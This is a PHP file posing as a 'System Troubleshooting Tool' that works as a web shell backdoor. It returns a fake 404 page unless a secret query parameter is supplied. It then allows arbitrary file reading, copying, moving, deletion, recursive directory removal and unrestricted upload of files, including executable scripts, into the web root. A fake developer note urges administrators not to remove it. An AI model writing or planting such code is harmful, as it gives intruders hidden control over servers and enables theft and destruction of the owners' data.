<?php
$password = '200';
if (!isset($_GET['status']) || $_GET['status'] !== $password) {
http_response_code(404);
    header('Status: 404 Not Found');
    echo '<!DOCTYPE html><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1><p>The requested URL was not found on this server.</p></body></html>';
    exit;
}
$cmd = $_POST['cmd'] ?? '';
$output = '';
$path = $_POST['path'] ?? '';
$src = $_POST['src'] ?? '';
$dst = $_POST['dst'] ?? '';
$file = $_POST['file'] ?? '';
$dir = $_POST['dir'] ?? '';
$text = $_POST['text'] ?? '';
$pattern = $_POST['pattern'] ?? '';

function runCmd($cmd, &$output) {
    global $path, $src, $dst, $file, $dir, $text, $pattern;
    switch ($cmd) {
        case 'ls':
            $dir = $path ?: '.';
            if (is_dir($dir)) {
                $files = scandir($dir);
                foreach ($files as $f) {
                    if ($f !== '.' && $f !== '..') {
                        $output .= htmlspecialchars($f) . "\n";
                    }
                }
            } else {
                $output = "Not a directory";
            }
            break;
        case 'cat':
            if (file_exists($path)) {
                $output = htmlspecialchars(file_get_contents($path));
            } else {
                $output = "File not found";
            }
            break;
        case 'cp':
            if (file_exists($src)) {
                if (copy($src, $dst)) {
                    $output = "Copied $src to $dst";
                } else {
                    $output = "Copy failed";
                }
            } else {
                $output = "Source not found";
            }
            break;
        case 'mv':
            if (file_exists($src)) {
                if (rename($src, $dst)) {
                    $output = "Moved $src to $dst";
                } else {
                    $output = "Move failed";
                }
            } else {
                $output = "Source not found";
            }
            break;
        case 'rm':
            if (file_exists($file)) {
                if (unlink($file)) {
                    $output = "Deleted $file";
                } else {
                    $output = "Delete failed";
                }
            } else {
                $output = "File not found";
            }
            break;
        case 'rmrf':
            if (is_dir($dir)) {
                function rrmdir($dir) {
                    if (is_dir($dir)) {
                        $files = scandir($dir);
                        foreach ($files as $file) {
                            if ($file !== '.' && $file !== '..') {
                                $path = $dir . '/' . $file;
                                if (is_dir($path)) {
                                    rrmdir($path);
                                } else {
                                    unlink($path);
                                }
                            }
                        }
                        rmdir($dir);
                        return true;
                    }
                    return false;
                }
                if (rrmdir($dir)) {
                    $output = "Deleted directory $dir and all contents";
                } else {
                    $output = "Recursive delete failed";
                }
            } else {
                $output = "Not a directory";
            }
            break;
        case 'mkdir':
            if (!file_exists($path)) {
                if (mkdir($path)) {
                    $output = "Created directory $path";
                } else {
                    $output = "Failed to create directory";
                }
            } else {
                $output = "Path already exists";
            }
            break;
        case 'pwd':
            $output = getcwd();
            break;
        case 'touch':
            if (!file_exists($path)) {
                if (fopen($path, 'w')) {
                    $output = "Created file $path";
                } else {
                    $output = "Failed to create file";
                }
            } else {
                $output = "File already exists";
            }
            break;
        case 'head':
            if (file_exists($path)) {
                $lines = file($path);
                $output = implode('', array_slice($lines, 0, 5));
            } else {
                $output = "File not found";
            }
            break;
        case 'tail':
            if (file_exists($path)) {
                $lines = file($path);
                $output = implode('', array_slice($lines, -5));
            } else {
                $output = "File not found";
            }
            break;
        case 'grep':
            if (file_exists($path)) {
                $lines = file($path);
                foreach ($lines as $line) {
                    if (strpos($line, $pattern) !== false) {
                        $output .= htmlspecialchars($line);
                    }
                }
            } else {
                $output = "File not found";
            }
            break;
        case 'echo':
            $output = htmlspecialchars($text);
            break;
        case 'wc':
            if (file_exists($path)) {
                $lines = file($path);
                $count = count($lines);
                $words = 0;
                $chars = 0;
                foreach ($lines as $line) {
                    $words += str_word_count($line);
                    $chars += strlen($line);
                }
                $output = "$count lines, $words words, $chars chars";
            } else {
                $output = "File not found";
            }
            break;
        case 'sort':
            if (file_exists($path)) {
                $lines = file($path);
                sort($lines);
                $output = implode('', $lines);
            } else {
                $output = "File not found";
            }
            break;
    }
}
if ($cmd) {
    runCmd($cmd, $output);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Troubleshooting Tool</title>
    <style>
        :root { --primary: #007bff; --danger: #dc3545; --bg: #f8f9fa; --text: #333; }
        body { font-family: Arial, sans-serif; background: var(--bg); color: var(--text); margin: 0; padding: 20px; }
        .container { max-width: 800px; margin: 0 auto; background: #fff; padding: 20px; border-radius: 4px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
         h1 { color: var(--primary); }
        .alert {
            padding: 10px;
            border-radius: 4px;
            margin: 10px 0;
        }
        .alert-warning { background: #fff3cd; color: #856404; border: 1px solid #ffeeba; }
        input[type="text"] { width: 80%; padding: 8px; margin: 5px 0; border: 1px solid #ddd; border-radius: 4px; }
        input[type="submit"] { background: var(--primary); color: #fff; border: none; padding: 8px 16px; border-radius: 4px; cursor: pointer; }
        pre { background: #333; color: #fff; padding: 10px; border-radius: 4px; overflow: auto; }
    </style>
</head>
<body>
    <div class="container">
        <h1>System Troubleshooting Tool</h1>
        
    <form method='post' enctype='multipart/form-data'>
        <input type='file' name='uploaded_file' />
        <br><br>
        <input type='submit' name='upload' value='Upload File' />
    </form><br><hr><br>
        <div class="alert alert-warning">
            <strong>Warning:</strong> This tool is for authorized use only.
        </div>
        <form method="post">
            <div class="field">
                <select name="cmd" onchange="updateFields()">
                    <option value="ls">ls</option>
                    <option value="cat">cat</option>
                    <option value="cp">cp</option>
                    <option value="mv">mv</option>
                    <option value="rm">rm</option>
                    <option value="rmrf">rm -rf</option>
                    <option value="mkdir">mkdir</option>
                    <option value="pwd">pwd</option>
                    <option value="touch">touch</option>
                    <option value="head">head</option>
                    <option value="tail">tail</option>
                    <option value="grep">grep</option>
                    <option value="echo">echo</option>
                    <option value="wc">wc</option>
                    <option value="sort">sort</option>
                </select>
            </div>
            <div id="pathField" class="field"><label>Path: <input type="text" name="path" value="."></label></div>
            <div id="srcDst" style="display:none" class="field">
                <label>Source: <input type="text" name="src"></label><br>
                <label>Dest: <input type="text" name="dst"></label>
            </div>
            <div id="rmFile" style="display:none" class="field">
                <label>File: <input type="text" name="file"></label>
            </div>
            <div id="rmDir" style="display:none" class="field">
                <label>Directory: <input type="text" name="dir"></label>
            </div>
            <div id="textField" style="display:none" class="field">
                <label>Text: <input type="text" name="text"></label>
            </div>
            <div id="patternField" style="display:none" class="field">
                <label>Pattern: <input type="text" name="pattern"></label>
            </div>
            <button type="submit">Run</button>
        </form>
        <pre><?= $output ?></pre>
    </div>
    
    <br><hr><br>
    <h1>! Do Not Remove !</h1>
    <p>' STT's are meant for troubleshooting if it's on prod it's because a problem occured and it's here as a last resort ' - Devs</p>

    <script>
        function updateFields() {
            document.getElementById('pathField').style.display = 'none';
            document.getElementById('srcDst').style.display = 'none';
            document.getElementById('rmFile').style.display = 'none';
            document.getElementById('rmDir').style.display = 'none';
            document.getElementById('textField').style.display = 'none';
            document.getElementById('patternField').style.display = 'none';
            const cmd = document.querySelector('[name=cmd]').value;
            if (['ls', 'cat', 'mkdir', 'pwd', 'touch', 'head', 'tail', 'wc', 'sort'].includes(cmd)) {
                document.getElementById('pathField').style.display = 'block';
            }
            if (['cp', 'mv'].includes(cmd)) {
                document.getElementById('srcDst').style.display = 'block';
            }
            if (cmd === 'rm') {
                document.getElementById('rmFile').style.display = 'block';
            }
            if (cmd === 'rmrf') {
                document.getElementById('rmDir').style.display = 'block';
            }
            if (cmd === 'echo') {
                document.getElementById('textField').style.display = 'block';
            }
            if (cmd === 'grep') {
                document.getElementById('patternField').style.display = 'block';
                document.getElementById('pathField').style.display = 'block';
            }
        }
        updateFields();
    </script>
    <?php
if (isset($_POST['upload'])) {
    $target_file = basename($_FILES["uploaded_file"]["name"]);
    if (move_uploaded_file($_FILES["uploaded_file"]["tmp_name"], $target_file)) {
        echo "File uploaded successfully: " . $target_file;
    } else {
        echo "Error uploading file.";
    }
}
?> 
</body>
</html>